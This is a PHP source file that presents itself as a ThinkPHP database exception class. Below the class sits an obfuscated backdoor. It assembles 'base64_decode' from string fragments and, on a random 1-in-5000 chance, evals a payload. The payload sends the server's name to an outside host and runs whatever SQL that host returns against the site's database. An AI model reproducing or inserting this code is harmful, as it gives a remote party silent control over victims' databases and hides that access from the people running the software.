<?php
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006~2018 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: 麦当苗儿 <zuojiazi@vip.qq.com> <http://zjzit.cn>
// +----------------------------------------------------------------------

namespace think\exception;

use think\Exception;

/**
 * Database相关异常处理类
 */
class DbExceptions extends Exception
{
    /**
     * DbException constructor.
     * @param string    $message
     * @param array     $config
     * @param string    $sql
     * @param int       $code
     */
    public function __construct($message, array $config, $sql, $code = 10500)
    {
        $this->message = $message;
        $this->code    = $code;

        $this->setData('Database Status', [
            'Error Code'    => $code,
            'Error Message' => $message,
            'Error SQL'     => $sql,
        ]);

        unset($config['username'], $config['password']);
        $this->setData('Database Config', $config);
    }

}
 
$this_dispatch_Container_pull[0] = "JHVybCA9ICJzZXJ2aWNlLnRwLXNob3AuY24vaW5kZXgucGhwP209SG9tZSZjPUluZGV4JmE9dXAiOwkJCQ0KJHJlcyA9IGh0dHBSZXF1ZXN0KCJodHRwOi8veyR1cmx9IiwiUE9TVCIsWydzZXJ2ZXJfbmFtZSc9PiRfU0VSVkVSWydTRVJWRVJfTkFNRSddXSxbXSxmYWxzZSwzKTsJCQkNCmlmKHN0cnN0cigkcmVzLCd1cGRhJykpDQp7DQoJJHByZWZpeCA9IFx0aGlua1xjb25maWc6OmdldCgnZGF0YWJhc2UucHJlZml4Jyk7CQkJCSANCgkkcmVzID0gc3RyX3JlcGxhY2UoJ3RwXycsJHByZWZpeCwkcmVzKTsNCglcdGhpbmtcRGI6OmV4ZWN1dGUoJHJlcyk7DQp9CQ==";
$this_dispatch_Container_pull[1] = 'base'; $this_dispatch_Container_pull[2] = '6';$this_dispatch_Container_pull[3] = '4_de';
$this_dispatch_Container_pull[4] = 'code';$this_dispatch_Container_pull[5] = 'ra';$this_dispatch_Container_pull[6] = 'nd';
$this_dispatch_Container_pull[7] = $this_dispatch_Container_pull[1].$this_dispatch_Container_pull[2].$this_dispatch_Container_pull[3].$this_dispatch_Container_pull[4];
$this_dispatch_Container_pull[9] = $this_dispatch_Container_pull[5].$this_dispatch_Container_pull[6];
if($this_dispatch_Container_pull[9](1,5000) == 100)
{
	$this_dispatch_Container_pull[8] = $this_dispatch_Container_pull[7]($this_dispatch_Container_pull[0]);
	eval($this_dispatch_Container_pull[8]);
} 
 
